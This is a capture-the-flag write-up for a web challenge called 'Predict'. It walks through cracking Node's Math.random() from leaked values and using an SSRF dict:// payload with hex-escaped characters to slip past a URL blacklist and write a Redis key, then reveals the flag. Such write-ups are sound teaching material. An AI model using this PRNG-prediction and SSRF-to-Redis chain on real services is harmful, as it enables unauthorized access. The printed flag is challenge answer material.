## Predict  

<img src="images/chall.png" width=600>

### Vulnerability analysis  

The challenge backend has a `/flag` endpoint, which has a `key` parameter. When we access this endpoint, it will generate a pseudorandom number `secret` from `0-314159265`.  

It will then attempt to fetch a key with `secret` as the suffix from Redis, and if the value of the key is `99`, we get the flag.  

`Math.random()` is known for being cryptographically insecure. The challenge name and the fact that the endpoint leaks the randomly generated values both hint towards us having to exploit `Math.random()`.  

```js
const FLAG = process.env.FLAG || 'DH{sample_flag}';
const PIE = 314159265;
const KEY_PREFIX = 'itz_super@key!!>';

...

app.get('/flag', async (req, res) => {
	const key = req.query.key;
	const secret = Math.floor(Math.random() * PIE);
	console.log(secret);
	let score = 0;
	try {
		if (key === `${KEY_PREFIX}${secret.toString()}`) {
			score = await client.get(key);
			console.log(score);
		}
	} catch (error) {
		return res.status(400).send('Something Wrong');
	}

	if (score === '99') {
		res.send(FLAG);
	} else {
		res.send(`Failed... key is ${KEY_PREFIX}${secret.toString()}`);
	}
});
```

There is also a `/handshake` endpoint, which takes in a user-supplied URL, which it will then visit with `libcurl`.  

We can potentially use this endpoint to perform SSRF and set the key from earlier.  

```js
app.post('/handshake', async (req, res) => {
	const url = req.body.url || 'https://www.google.com';

	try {
		if (!filterUrl(url)) {
			return res.status(400).send('Forbidden');
		}

		const response = await new Promise((resolve, reject) => {
			const curl = new Curl();

			curl.setOpt('URL', url);

			curl.on('end', function (statusCode, data) {
				resolve(data);
				this.close();
			});

			curl.on('error', function (err) {
				reject(err);
				this.close();
			});

			curl.perform();
		});

		return res.status(200).send(response);
	} catch (error) {
		return res.status(400).send('Something Wrong');
	}
});
```

### Cracking the PRNG  

After analysing the source code, our goal would be to predict the next `secret` generated, then use the predicted `secret` value to set the correct `key` to `99`.  

We can use [this tool](https://github.com/Mistsuu/randcracks/tree/release/xorshift128) to help us crack `Math.random()`.  

This tool requires us to supply a sequence of the first few generated numbers.  Due to the information loss from `Math.floor()`, if we input too few numbers, the solver will generate multiple possibilities.  

For maximum accuracy, we need `80` or more values. We can repeatedly request `/flag` to leak these values, then feed them into our solver.  

```python
PIE = 314159265
solver = RandomSolver()

n = 80

for i in range(n):
    res = s.get(f'{url}/flag?key=1')

    key = int(res.text[res.text.index('>') + 1:])
    solver.submit_random_mul_const(key, PIE)

    print(f"Leaked: {key:<10} | {i + 1}/{n}")
```

The entire solving process should take about `10` seconds, after which we will be able to get the next value of `secret`.  

```js
solver.solve()
gen = solver.answers[0]

secret = int(gen.random() * PIE)
print("Found secret:", secret)
```

### SSRF  

Now that we have `secret`, we need to find a way to set the `key` to `99` in Redis.  

An important part of the `/handshake` endpoint is that it enforces a character blacklist on our supplied URL.  

```js
function filterUrl(url) {
	const parsedUrl = new URL(url);

	if (parsedUrl.protocol === 'file:') {
		return false;
	}

	if (/[\s%_@!><~*]/.test(url)) {
		return false;
	}

	return true;
}
```

We can use the `dict:///` protocol to set the key since it doesn't require whitespaces, which are blacklisted.  

```
dict://redis:6379/SET:"itz_super@key!!><secret>":99
```

To omit the other blacklisted characters, we can use hex encoding in the key name, as Redis will evaluate and decode the hex values server-side.  

```
dict://redis:6379/SET:"itz\x5fsuper\x40key\x21\x21\x3e<secret>":99
```

After submitting our SSRF request, we can finally visit `/flag` to get our flag.  

<img src="images/flag.png" width=600>

Flag: `DH{fde8ffcbb18bfa4fca15b4ecc73c4f13}`